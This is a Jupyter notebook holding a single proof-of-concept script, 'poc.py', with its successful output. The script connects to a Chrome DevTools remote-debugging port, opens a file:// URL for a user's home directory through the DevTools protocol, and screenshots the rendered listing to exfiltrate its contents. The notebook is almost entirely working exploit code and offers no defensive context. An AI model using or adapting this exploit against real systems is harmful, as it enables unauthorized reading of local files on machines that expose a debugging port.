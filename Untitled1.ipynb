{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "82170725-3ffc-48a6-8edd-ef39503ddcf7",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Connect to url: ws://localhost:41155/devtools/page/3cbc4daf-4182-4f38-89fd-b119725dfcaa\n",
      "Target id: ef2ab82e-68fb-464e-88de-0ed324c1dcdc\n",
      "Session id: 2b1016e2-b68e-4801-baf7-192ab4d69ea9\n",
      "Success file reading\n"
     ]
    }
   ],
   "source": [
    "#poc.py\n",
    "import json\n",
    "import requests\n",
    "import websocket\n",
    "import base64\n",
    "\n",
    "debugger_address = 'http://localhost:41155' # Change port\n",
    "\n",
    "response = requests.get(f'{debugger_address}/json')\n",
    "tabs = response.json()\n",
    "\n",
    "web_socket_debugger_url = tabs[0]['webSocketDebuggerUrl'].replace('127.0.0.1', 'localhost')\n",
    "\n",
    "print(f'Connect to url: {web_socket_debugger_url}')\n",
    "\n",
    "ws = websocket.create_connection(web_socket_debugger_url, suppress_origin=True)\n",
    "\n",
    "command = json.dumps({\n",
    "            \"id\": 5,\n",
    "            \"method\": \"Target.createTarget\",\n",
    "            \"params\": {\n",
    "                \"url\": \"file:///home/alex\"\n",
    "            }\n",
    "})\n",
    "\n",
    "ws.send(command)\n",
    "target_id = json.loads(ws.recv())['result']['targetId']\n",
    "print(f'Target id: {target_id}')\n",
    "\n",
    "command = json.dumps({\n",
    "                \"id\": 5,\n",
    "                \"method\": \"Target.attachToTarget\",\n",
    "                \"params\": {\n",
    "                    \"targetId\": target_id,\n",
    "                    \"flatten\": True\n",
    "                }})\n",
    "\n",
    "ws.send(command)\n",
    "session_id = json.loads(ws.recv())['params']['sessionId']\n",
    "print(f'Session id: {session_id}')\n",
    "\n",
    "command = json.dumps({\n",
    "            \"id\": 5,\n",
    "            \"sessionId\": session_id,\n",
    "            \"method\": \"Page.captureScreenshot\",\n",
    "            \"params\": {\n",
    "                \"sessionId\": session_id,\n",
    "                \"format\": \"png\"\n",
    "            }\n",
    "        })\n",
    "\n",
    "ws.send(command)\n",
    "result = json.loads(ws.recv())\n",
    "# I don’t know why but you have to do this twice\n",
    "ws.send(command)\n",
    "result = json.loads(ws.recv())\n",
    "\n",
    "if 'result' in result and 'data' in result['result']:\n",
    "    print(\"Success file reading\")\n",
    "    with open(\"root.png\", \"wb\") as file:\n",
    "        file.write(base64.b64decode(result['result']['data']))\n",
    "else:\n",
    "    print(\"Error file reading\")\n",
    "\n",
    "ws.close()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "63633d60-2632-4147-9645-45570c7b6ea3",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
